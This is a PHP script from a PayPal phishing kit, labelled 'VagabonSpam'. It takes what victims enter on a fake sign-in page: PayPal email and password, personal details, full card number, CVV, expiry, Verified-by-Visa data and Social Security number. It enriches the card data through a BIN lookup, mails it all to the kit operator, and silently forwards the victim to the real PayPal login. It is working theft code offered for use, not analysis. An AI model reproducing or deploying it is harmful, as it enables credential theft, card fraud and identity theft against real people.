<?php
error_reporting(0);
ob_start();
session_start();
//---------------------------------------------------------------------------------------- INC
	include('./includes/funciones.php');
	include('./includes/bots.php');
	include('./info.php');
//---------------------------------------------------------------------------------------- VAR	
	$redi			    = "https://www.paypal.com/";
	$ip 				= getenv("REMOTE_ADDR");
	$_SESSION['ok']   = $_POST['email'];
	$_SESSION['by']   = $_POST['pass'];

if($_SESSION['CAPTCHA'] == true){

$str_cc = ($_POST['card_number']['0'].$_POST['card_number']['1'].$_POST['card_number']['2'].$_POST['card_number']['3'].$_POST['card_number']['4'].$_POST['card_number']['5'].$_POST['card_number']['6']);
$str = str_replace(' ', '', $str_cc);
$scheme = @json_decode(file_get_contents("https://lookup.binlist.net/".$str));
if($scheme && $scheme->scheme)
{
	$scheme_cc = $scheme->scheme;
}
$brand = @json_decode(file_get_contents("https://lookup.binlist.net/".$str));
if($brand && $brand->brand != null)
{
	$brand_cc = $brand->brand;
}
$bank = @json_decode(file_get_contents("https://lookup.binlist.net/".$str));
if($bank && $bank->bank->name != null)
{
	$bank_cc = $bank->bank->name;
}
	$subject = "❤ ".$str."- ".$brand_cc." - ".$bank_cc."❤ [ $ip ]";
    $headers="From:Any Sanchez <anylogin@hotmail.com>\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
		$text_result_anon .= "|----------| VagabonSpam |--------------|\n";
	$text_result_anon .= "|----------+| LOGIN |+--------------|			\n"; 
	$text_result_anon .= "|E-M-L      :  " .$_POST['email']."			\n";
	$text_result_anon .= "|P-S-S-D    :  " .$_POST['pass']."		    \n";
	$text_result_anon .= "|----------+| BILLING |+--------------|		\n"; 
	$text_result_anon .= "|C-T-R-Y    :  " .$_POST['first_name']."		\n";
	$text_result_anon .= "|D-B-R-T    :  " .$_POST['last_name']." 		\n";
	$text_result_anon .= "|P-H-N      :  " .$_POST['phone']."			\n";
	$text_result_anon .= "|I-P        :  " .$ip.  " 					\n";
	$text_result_anon .= "|----------+| CARD |+--------------|			\n"; 
	$text_result_anon .= "|C-H-D-R    :  " .$_POST['card_name']." 		\n";
	$text_result_anon .= "|C-N-B-R    :  " .$_POST['card_number']."		\n";
	$text_result_anon .= "|C-V-V      :  " .$_POST['cvv2']." 			\n";
	$text_result_anon .= "|E-X-P      :  " .$_POST['card_month']." 		\n";
	$text_result_anon.=	 "|L-V-L	  :	 " .$brand_cc."					\n";
	$text_result_anon.=	 "|B-N-K	  :  " .$bank_cc."					\n";
	$text_result_anon .= "|----------+| VBV |+--------------|			\n"; 
	$text_result_anon .= "|+info    :  " .$_POST['sort']." 			\n";
	$text_result_anon .= "|+INFO+    :  " .$_POST['secure']." 			\n";
	$text_result_anon .= "|      :  " .$_POST['ssn']." 			\n";
	$text_result_anon .= "|--- http://www.geoiptool.com/?IP=$ip ----	\n";
	$text_result_anon .= "|----------| VagabonSpam |--------------|\n";
	$text_result_anon .= "|----------| VagabonSpam |--------------|\n";
	mail($enviardatos,$subject,$text_result_anon,$headers);

	$sajal = fopen();  
	fwrite($sajal, $text_result_anon);
//---------------------------------------------------------------------------------------- RLG
	echo "<html><head> 
	<meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1252\"> 
	<script src=\"./lib/js/jquery.1.11.1.min.js\"></script> 
	<script> 
	$(document).ready(function () { 
	document.forms[\"login\"].submit(); 
	}); 
	</script> 
	</head><body style=\"background-image: url('./lib/img/loading-dots.gif');background-repeat: no-repeat;background-attachment: fixed;background-position: center;\">
	<div style=\"display:none\">
	<form  action=\"" .$redi.  "\" method=\"post\" class=\"proceed maskable\" name=\"login\"autocomplete=\"off\" novalidate>
	<input id=\"email\"name=\"login_email\"type=\"email\"class=\"hasHelp  validateEmpty  \"required=\"required\" aria-required=\"true\"value=\"".$_SESSION['ok']."\"		autocomplete=	\"off\"			placeholder=	\"Email address\"		/>
	<input id=\"password\"name=\"login_password\"type=\"password\"class=\"hasHelp  validateEmpty  \"required=\"required\" aria-required=\"true\"value=\"".$_SESSION['by']."\"		placeholder=	\"Password\"		/>
	<button class=\"button actionContinue\" type=\"submit\" id=\"btnLogin\" name=\"btnLogin\" value=\"Login\">Log In</button>
	</form>
	</div>
	</body></html>\n"; 
}
else{
	header('location: signin.php');
}
?>	
